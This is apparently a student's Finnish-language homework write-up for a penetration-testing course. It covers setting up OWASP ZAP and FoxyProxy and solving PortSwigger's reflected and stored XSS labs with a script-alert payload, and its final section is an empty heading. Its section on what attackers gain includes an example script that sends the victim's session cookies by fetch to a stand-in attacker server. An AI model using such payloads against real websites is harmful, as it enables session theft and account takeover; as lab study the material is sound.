# h4 Täysin Laillinen Sertifikaatti  
## x) Tiivistelmä  
## OWASP TOP 10:2021  
-94% sovelluksista testattu jonkinlaisella broken access controllilla.  
-Access control menetelmän idea on se, että käyttäjät eivät voi toimia omien oikeuksien ulkopuolella.  
-Toimii vain jos hyökkääjä ei pääse muokkaamaan metadataa tai access control checkejä.  
(OWASP TOP 10, 2021)  

## PortSwigger Academy
### Insecure direct object references (IDOR)  
-Access Control tyyppinen haavoittuvuus.  
-Hyökkääjä voi muokata URL:ia ja päästä näkemään salaisia tietoja.  
(PortSwigger IDOR)

### Path traversal  
-Tunnetaan myös nimellä Directory traversal.  
-Päästää hyökkääjän lukemaan sattumanvaraisia tiedostoja palvelimella jossa pyörii sovellus.  
-Muokkaamalla hakemisto polkua URL:issa hyökkääjä voi päästä salaittuihin tiedostoihin.  
-Tehokkain tapa ehkäistä path traversal liittyviä haavoittuvuuksia on välttää käyttäjän antaman syötteen välittämistä tiedostojärjestelmän rajapinnoille kokonaan.  
(PortSwigger Path traversal)  

### Cross-site scripting  
-Mahdollistaa hyökkääjän esiintyä uhrina, jolloin voi tehdä kaikkea mitä uhrikin.  
-Manipuloidaan nettisivua niin, että se palauttaa haitallista javascriptiä käyttäjälle.  
-Kolme tyyppiä: reflected, stored ja DOM-based.  
-Puolustatutuminen syötteiden suodatuksella, tulosteen oikealla enkoodauksella ja oikeat Content-Type headerit sekä Content Security Policyt.  
(PortSwigger Cross-site scripting)  

## a) Totally Legit Sertificate  
Aloitin ajamalla komennon `sudo apt-get install zaproxy`, joka löytyi kurssin tehtäväsivulta. (Karvinen 2026)  
<img width="698" height="444" alt="image" src="https://github.com/user-attachments/assets/709182aa-5338-4f6a-8972-84ff6ec79ca9" />  
Käynnistin zaproxyn komennolla `zaproxy`. Menin kohtaan Tools -> Options -> Network -> Server Certificates. Tässä näkyi generoituna sertifikaatti.  
<img width="1149" height="1077" alt="image" src="https://github.com/user-attachments/assets/96dfdbe9-324b-43e9-b53e-a3af3d98f859" />  
Options kohdasta Display sai ZAP:in kaappaamaan myös kuvat.  
<img width="367" height="31" alt="image" src="https://github.com/user-attachments/assets/cd4c0571-1cac-4f86-b854-8741462dcbda" />  
Tallensin sertifikaatin kotihakemistooni "Save" napista. Avasin Firefoxin ja hain Settings kohdasta "Certificate".  
<img width="665" height="234" alt="image" src="https://github.com/user-attachments/assets/abeaa818-c45a-40d7-ae8f-a49af126490e" />  
Sitten View Certificates, Authorities ja Import... Toin aikaisemmin tallentamani sertifikaatin ja valitsin seuraavan kohdan.  
<img width="798" height="303" alt="image" src="https://github.com/user-attachments/assets/d73c8714-2745-4c51-b2f5-71fb847b2c4b" />  
Seuraavaksi hain Firefoxin asetuksista "Proxy" ja avasin Network Settings asetukset. Laitoin asetukset seuraavanlaisesti.  
<img width="758" height="810" alt="image" src="https://github.com/user-attachments/assets/d0668253-31f2-4804-87d8-2d43e820489a" />  
Avasin PortSwigger sivun ja ZAP näytti tältä.  
<img width="1282" height="1321" alt="image" src="https://github.com/user-attachments/assets/d4182361-8395-43d3-9835-f84fb72076ec" />  

## b) Kettumaista  
Menin sivulle https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/ ja asensin FoxyProxyn Firefoxiin. Nyt FoxyProxy on Firefoxissa.  
<img width="484" height="448" alt="image" src="https://github.com/user-attachments/assets/9bd6a66e-fc80-48f4-a16e-90fc65f64a4b" />  
Menin kohtaan Options, Proxies, Add. Laitoin seuraavat asetukset Proxylle.  
<img width="1001" height="529" alt="image" src="https://github.com/user-attachments/assets/c801aa00-ee0a-40e3-b21c-843a7b0bb034" />  
web-security-academy.net patternin pitäisi toimia kaikissa PortSwigger labroissa.
Sitten Save ja testaamaan, että proxy toimii.  
Käynnistin zaproxyn, FoxyProxysta "Proxy by Patterns" valittuna ja avasin PortSwiggeristä labran. FoxyProxy toimii labra sivulla.  
<img width="1258" height="1320" alt="9ee7800d-903e-4f6c-a805-bc034bd44c60" src="https://github.com/user-attachments/assets/3d71d846-50b1-48f8-b94d-4f59531f2d8a" />  
Muut sivut eivät näy proxyssa, testasin Wikipedialla.  
<img width="1272" height="1272" alt="Näyttökuva 2026-09-15 155243" src="https://github.com/user-attachments/assets/1d296251-f4d7-40ef-b962-fc4598f9382e" />  

## c) Lab: Reflected XSS into HTML context with nothing encoded  
Tämän labran tarkoitus on suorittaa reflected cross-site scripting attack, joka kutsuu alert funktiota. 
Kokeilin ensin laittaa hakukenttään "test" ja katsoin näkyykö URL:issa mitään. URL:iin tuli näkyviin test.  
<img width="709" height="57" alt="image" src="https://github.com/user-attachments/assets/dc607cff-aa67-4b33-91cc-58b489caf355" />  
Tutkin ZAP:ia samalla ja löysin kohdan HTML-elementin sisältä, jossa "test" hakuni tehtiin.  
<img width="499" height="109" alt="image" src="https://github.com/user-attachments/assets/40c2820d-3e4e-4e88-bec0-d8134581caa6" />  
ZAP:in perusteella sivu ei käsittele hakua mitenkään, joten hakukenttään syöttämällä `<script>alert(1)</script>` saa tämän tuloksen.  
<img width="792" height="762" alt="image" src="https://github.com/user-attachments/assets/26d211d0-25a9-41be-a041-b7a1042196f8" />  
<img width="1194" height="207" alt="image" src="https://github.com/user-attachments/assets/7f1e367c-86b1-4410-8513-c6eaec807cdb" />  
(PortSwigger Lab: Reflected XSS into HTML context with nothing encoded.)  

## d) Lab: Stored XSS into HTML context with nothing encoded  
Tämän labran tarkoitus suorittaa stored cross-site scripting attack jättämällä kommentti, joka kutsuu alert funktiota, kun blogijulkaisua katsotaan.  
Aloitin avaamalla blogin ja kokeilin jättää kommentiksi saman funktion `<script>alert(1)</script>`, kuin edellisessä labissa.  
<img width="757" height="439" alt="image" src="https://github.com/user-attachments/assets/95fd6aed-75e4-4d41-9bc4-da8bd48457dc" />  
Tämä toimi, koska sivusto tallentaa kommentin ja aina kun joku avaa sivun minne kommentti on julkaistu, sivu ajaa haitallisen ohjelman käyttäjän selaimessa. (PortSwigger. Lab: Stored XSS into HTML context with nothing encoded.)  
<img width="1207" height="207" alt="image" src="https://github.com/user-attachments/assets/2fbe1661-b8b3-42d3-af10-b899f2e200aa" />  

## e) XSS-hyökkäyksen hyöty hyökkääjälle 
Koska hyökkääjään syöttämä koodi suoritetaan sivustolla samoilla oikeuksilla kuin sivun oma koodi, saa hyökkääjä pääsyn kaikkeen mihin sivustokin. Esimerkkinä, jos hyökkääjä syöttäisi koodin `<script>
fetch('https://hyökkääjän-palvelin.com/varastettu?data=' + document.cookie)
</script>`  
saisi hyökkääjä uhrin istuntoevästeet ja pääsisi kirjautumaan uhrina sivustolle ilman tunnuksia.  

## f) Lab: File path traversal, simple case  




## Lähteet  
OWASP TOP 10. 2021. Broken Access Control. https://top10.owasp.org/2021/A01_2021-Broken_Access_Control/  
PortSwigger. Insecure direct object references (IDOR). https://portswigger.net/web-security/access-control/idor  
PortSwigger. Path traversal. https://portswigger.net/web-security/file-path-traversal  
PortSwigger. Cross-site scripting. https://portswigger.net/web-security/cross-site-scripting  
PortSwigger. Cross-site scripting. https://portswigger.net/web-security/all-labs#cross-site-scripting  
PortSwigger. Lab: Reflected XSS into HTML context with nothing encoded. https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded  
PortSwigger. Lab: Stored XSS into HTML context with nothing encoded. https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded  
Karvinen, Tero. 2026. Tunkeutumistestaus. https://terokarvinen.com/tunkeutumistestaus/  
Mozilla. https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
